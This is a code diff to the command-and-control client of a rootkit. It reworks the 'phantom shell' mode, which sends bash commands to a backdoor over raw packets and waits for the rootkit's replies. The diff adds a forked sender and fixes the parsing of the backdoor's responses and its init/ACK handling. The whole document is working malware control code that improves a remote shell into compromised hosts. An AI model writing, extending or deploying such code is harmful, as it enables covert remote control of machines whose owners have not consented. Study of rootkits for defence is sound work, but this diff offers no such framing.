@@ -9,6 +9,7 @@
 #include <netdb.h>
 #include <stdlib.h>
 #include <time.h>
+#include <unistd.h>
 
 #include "../common/constants.h"
 #include "../common/c&c.h"
@@ -112,17 +113,27 @@ int phantom_shell_mode(char* buf, char* local_ip, char* dest){
 	char* request = calloc(4096, sizeof(char));
 	strcpy(request, CC_PROT_BASH_COMMAND_REQUEST);
 	strcat(request, buf);
-    packet_t packet = build_standard_packet(8000, 9000, local_ip, dest, 4096, request);
-    //printf("Sending %s\n", msg);
-    if(rawsocket_send(packet)<0){
-        printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
+    packet_t packet;
+    pid_t pid = fork();
+    if(pid<0){
+        printf("["KRED"ERROR"RESET"]""Could not fork() process\n");
         return 1;
+    }
+    if(pid==0){
+        sleep(5);
+        packet = build_standard_packet(8000, 9000, local_ip, dest, 4096, request);
+        //printf("Sending %s\n", msg);
+        if(rawsocket_send(packet)<0){
+            printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
+            return 1;
+        }
+        exit(0);
     }
     printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
     packet = rawsocket_sniff_pattern(CC_PROT_BASELINE);
     char* res = packet.payload;
     //TODO make the shell to fork and wait for response, but accept new requests meanwhile
-    if(strncmp(buf, CC_PROT_BASH_COMMAND_RESPONSE, strlen(CC_PROT_BASH_COMMAND_RESPONSE))==0){
+    if(strncmp(res, CC_PROT_BASH_COMMAND_RESPONSE, strlen(CC_PROT_BASH_COMMAND_RESPONSE))==0){
         //Received a response
         char *p;
         p = strtok(buf, "#");
@@ -133,10 +144,10 @@ int phantom_shell_mode(char* buf, char* local_ip, char* dest){
         }else{
             printf("[" KRED "ERROR" RESET "]""Could not parse backdoor answer correctly, ignoring\n");
         }
-    }else if(strncmp(buf, CC_PROT_ERR, strlen(CC_PROT_ERR))==0){
+    }else if(strncmp(res, CC_PROT_ERR, strlen(CC_PROT_ERR))==0){
 		printf("[" KRED "ERROR" RESET "]""Backdoor did not understand the request: %s\n", request);
-    }else if(strncmp(buf, CC_PROT_PHANTOM_SHELL_INIT, strlen(CC_PROT_PHANTOM_SHELL_INIT))==0){
-        printf("[" KGRN "INIT" RESET "]""The backdoor just signaled that everything is ready and working!");
+    }else if(strncmp(res, CC_PROT_PHANTOM_SHELL_INIT, strlen(CC_PROT_PHANTOM_SHELL_INIT))==0){
+        printf("[" KGRN "WARN" RESET "]""The backdoor just signaled an ACK. This should not have happened.");
     }else{
 		//If at this point, then we failed to identify the backdoor message
 		//We attempt to send a final message indicating we are halting the connection
@@ -427,7 +438,7 @@ void phantom_shell_request(char* argv){
     printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
 
     //Wait for rootkit ACK to ensure it's up
-    rawsocket_sniff_pattern(CC_PROT_ACK);
+    rawsocket_sniff_pattern(CC_PROT_PHANTOM_SHELL_INIT);
     printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");   
     
     client_mode = CLIENT_MODE_PHANTOM_SHELL;
